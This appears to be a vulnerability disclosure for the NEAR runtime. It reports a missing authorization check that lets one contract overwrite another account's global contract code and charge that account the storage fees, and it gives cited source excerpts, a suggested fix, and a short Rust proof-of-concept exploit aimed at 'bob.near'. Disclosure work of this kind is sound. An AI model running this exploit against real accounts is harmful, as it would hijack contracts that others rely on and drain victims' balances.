### Title
Missing Authorization Check in `action_deploy_global_contract` Allows Any Contract to Overwrite Another Account's Global Contract Namespace Entry - (`runtime/runtime/src/global_contracts.rs`)

### Summary

When `GlobalContractDeployMode::AccountId` is used, the global contract is keyed by the **receipt receiver's** account ID. Because any contract can create a receipt targeting any account via `promise_batch_create`, and because `action_deploy_global_contract` contains no check that the receipt predecessor matches the receiver, account A can register or overwrite the global contract stored under account B's ID without B's consent.

### Finding Description

The host function `promise_batch_action_deploy_global_contract_by_account_id` (both in `runtime/near-vm-runner/src/logic/logic.rs` and `runtime/near-vm-runner/src/wasmtime_runner/logic.rs`) takes only `(promise_idx, code_len, code_ptr)` — no explicit `account_id_ptr`. The "by account id" key is derived entirely from the **receipt receiver**, which is set when the promise is created via `promise_batch_create(account_id_len, account_id_ptr)`. A contract can pass any valid account ID there.

The full call chain:

1. **Contract A** calls `promise_batch_create("bob.near")` — creates a receipt whose receiver is `bob.near`. [1](#0-0) 

2. **Contract A** calls `promise_batch_action_deploy_global_contract_by_account_id(promise_idx, code_len, code_ptr)` — appends a `DeployGlobalContractAction { deploy_mode: AccountId }` to that receipt. No check is made that the receipt receiver equals `current_account_id`. [2](#0-1) 

3. The receipt executes on `bob.near`'s shard. The runtime calls `action_deploy_global_contract(state_update, account, account_id="bob.near", ...)`. [3](#0-2) 

4. Inside `action_deploy_global_contract`, there is **no authorization check** — it immediately calls `initiate_distribution` with `account_id = "bob.near"`. [4](#0-3) 

5. `initiate_distribution` constructs `GlobalContractIdentifier::AccountId("bob.near")` and writes the attacker's code to `TrieKey::GlobalContractCode { identifier: GlobalContractCodeIdentifier::AccountId("bob.near") }`. [5](#0-4) 

### Impact Explanation

The **exact corrupted trie value** is:

```
TrieKey::GlobalContractCode {
    identifier: GlobalContractCodeIdentifier::AccountId("bob.near")
}
```

set to attacker-controlled Wasm bytecode. Any account that previously called `UseGlobalContract(AccountId("bob.near"))` now executes the attacker's code. The attacker can also increment the nonce for `bob.near`'s global contract slot, preventing `bob.near` from ever deploying a fresh version with a lower nonce (since `check_and_update_nonce` rejects `incoming_nonce < stored_nonce`). [6](#0-5) 

Storage costs are charged to `bob.near`'s account (the receipt receiver), so the attack also drains `bob.near`'s balance. [7](#0-6) 

### Likelihood Explanation

Any unprivileged account that can deploy a contract and pay gas can execute this attack. No special privileges are required. The only cost is gas and the storage fee charged to the victim's account (which the attacker does not pay).

### Recommendation

In `action_deploy_global_contract`, when `deploy_mode == GlobalContractDeployMode::AccountId`, add an authorization check:

```rust
if deploy_contract.deploy_mode == GlobalContractDeployMode::AccountId {
    // The predecessor must be the receiver (self-call only)
    if receipt.predecessor_id() != account_id {
        result.result = Err(ActionErrorKind::ActorNoPermission {
            account_id: account_id.clone(),
            actor_id: receipt.predecessor_id().clone(),
        }.into());
        return Ok(());
    }
}
```

Alternatively, enforce this at the VM host-function level by checking `receipt_receiver == current_account_id` before appending the action. [4](#0-3) 

### Proof of Concept

```rust
// Deployed on account "attacker.near"
#[no_mangle]
pub unsafe fn exploit() {
    // Create a receipt targeting victim "bob.near"
    let target = b"bob.near";
    let promise_idx = promise_batch_create(target.len() as u64, target.as_ptr() as u64);

    // Attach a DeployGlobalContractAction with mode=AccountId
    // The global contract will be keyed by "bob.near" (the receipt receiver)
    let malicious_wasm: &[u8] = include_bytes!("malicious.wasm");
    promise_batch_action_deploy_global_contract_by_account_id(
        promise_idx,
        malicious_wasm.len() as u64,
        malicious_wasm.as_ptr() as u64,
    );
    // After execution: TrieKey::GlobalContractCode { AccountId("bob.near") }
    // is overwritten with malicious_wasm.
    // All accounts using GlobalContractIdentifier::AccountId("bob.near")
    // now execute the attacker's code.
}
```

### Citations

**File:** runtime/near-vm-runner/src/logic/logic.rs (L2294-2311)
```rust
    pub fn promise_batch_create(
        &mut self,
        account_id_len: u64,
        account_id_ptr: u64,
    ) -> Result<u64> {
        self.result_state.gas_counter.pay_base(base)?;
        if self.context.is_view() {
            return Err(HostError::ProhibitedInView {
                method_name: "promise_batch_create".to_string(),
            }
            .into());
        }
        let account_id = self.read_and_parse_account_id(account_id_ptr, account_id_len)?;
        let sir = account_id == self.context.current_account_id;
        self.pay_gas_for_new_receipt(sir, &[])?;
        let new_receipt_idx = self.ext.create_action_receipt(vec![], account_id)?;

        self.checked_push_promise(Promise::Receipt(new_receipt_idx))
```

**File:** runtime/near-vm-runner/src/logic/logic.rs (L2558-2599)
```rust
    pub fn promise_batch_action_deploy_global_contract_by_account_id(
        &mut self,
        promise_idx: u64,
        code_len: u64,
        code_ptr: u64,
    ) -> Result<()> {
        self.promise_batch_action_deploy_global_contract_impl(
            promise_idx,
            code_len,
            code_ptr,
            GlobalContractDeployMode::AccountId,
            "promise_batch_action_deploy_global_contract_by_account_id",
        )
    }

    fn promise_batch_action_deploy_global_contract_impl(
        &mut self,
        promise_idx: u64,
        code_len: u64,
        code_ptr: u64,
        mode: GlobalContractDeployMode,
        method_name: &str,
    ) -> Result<()> {
        self.result_state.gas_counter.pay_base(base)?;
        if self.context.is_view() {
            return Err(HostError::ProhibitedInView { method_name: method_name.to_owned() }.into());
        }
        let code = get_memory_or_register!(self, code_ptr, code_len)?;
        let code_len = code.len() as u64;
        let limit = self.config.limit_config.max_contract_size;
        if code_len > limit {
            return Err(HostError::ContractSizeExceeded { size: code_len, limit }.into());
        }
        let code = code.into_owned();

        let (receipt_idx, sir) = self.promise_idx_to_receipt_idx_with_sir(promise_idx)?;

        self.pay_action_base(ActionCosts::deploy_global_contract_base, sir)?;
        self.pay_action_per_byte(ActionCosts::deploy_global_contract_byte, code_len, sir)?;

        self.ext.append_action_deploy_global_contract(receipt_idx, code, mode);
        Ok(())
```

**File:** runtime/runtime/src/lib.rs (L593-604)
```rust
            Action::DeployGlobalContract(deploy_global_contract) => {
                metrics::ACTION_CALLED_COUNT.deploy_global_contract.inc();
                let account = account.as_mut().expect(EXPECT_ACCOUNT_EXISTS);
                action_deploy_global_contract(
                    state_update,
                    account,
                    account_id,
                    apply_state,
                    deploy_global_contract,
                    &mut result,
                )?;
            }
```

**File:** runtime/runtime/src/global_contracts.rs (L23-61)
```rust
pub(crate) fn action_deploy_global_contract(
    state_update: &mut TrieUpdate,
    account: &mut Account,
    account_id: &AccountId,
    apply_state: &ApplyState,
    deploy_contract: &DeployGlobalContractAction,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    let _span = tracing::debug_span!(target: "runtime", "action_deploy_global_contract").entered();

    let storage_cost = apply_state
        .config
        .fees
        .storage_usage_config
        .global_contract_storage_amount_per_byte
        .saturating_mul(deploy_contract.code.len() as u128);
    let Some(updated_balance) = account.amount().checked_sub(storage_cost) else {
        result.result = Err(ActionErrorKind::LackBalanceForState {
            account_id: account_id.clone(),
            amount: storage_cost,
        }
        .into());
        return Ok(());
    };
    result.tokens_burnt =
        result.tokens_burnt.checked_add(storage_cost).ok_or(IntegerOverflowError)?;
    account.set_amount(updated_balance);

    initiate_distribution(
        state_update,
        account_id.clone(),
        deploy_contract.code.clone(),
        &deploy_contract.deploy_mode,
        apply_state.shard_id,
        result,
    )?;

    Ok(())
}
```

**File:** runtime/runtime/src/global_contracts.rs (L141-168)
```rust
fn initiate_distribution(
    state_update: &mut TrieUpdate,
    account_id: AccountId,
    contract_code: Arc<[u8]>,
    deploy_mode: &GlobalContractDeployMode,
    current_shard_id: ShardId,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    let id = match deploy_mode {
        GlobalContractDeployMode::CodeHash => {
            GlobalContractIdentifier::CodeHash(hash(&contract_code))
        }
        GlobalContractDeployMode::AccountId => {
            GlobalContractIdentifier::AccountId(account_id.clone())
        }
    };
    // Increment the nonce and write it to state immediately to prevent multiple
    // distributions with the same nonce from being initiated. This requires
    // allowing the same nonce in the freshness check when applying the
    // distribution receipt.
    let nonce = increment_nonce(state_update, &id)?;
    let distribution_receipt =
        GlobalContractDistributionReceipt::new(id, current_shard_id, vec![], contract_code, nonce);
    let distribution_receipts =
        Receipt::new_global_contract_distribution(account_id, distribution_receipt);
    // No need to set receipt_id here, it will be generated as part of apply_action_receipt
    result.new_receipts.push(distribution_receipts);
    Ok(())
```

**File:** runtime/runtime/src/global_contracts.rs (L238-256)
```rust
fn check_and_update_nonce(
    global_contract_data: &GlobalContractDistributionReceipt,
    identifier: &GlobalContractCodeIdentifier,
    state_update: &mut TrieUpdate,
) -> Result<bool, RuntimeError> {
    let nonce_key = TrieKey::GlobalContractNonce { identifier: identifier.clone() };
    let stored_nonce = get_nonce(state_update, &nonce_key)?;
    let incoming_nonce = global_contract_data.nonce();

    // Allow the same nonce since the nonce is updated immediately when
    // initiating distribution to prevent multiple distributions with the same
    // nonce from being initiated.
    if incoming_nonce < stored_nonce {
        return Ok(false);
    }

    set_nonce(state_update, nonce_key, incoming_nonce);
    Ok(true)
}
```
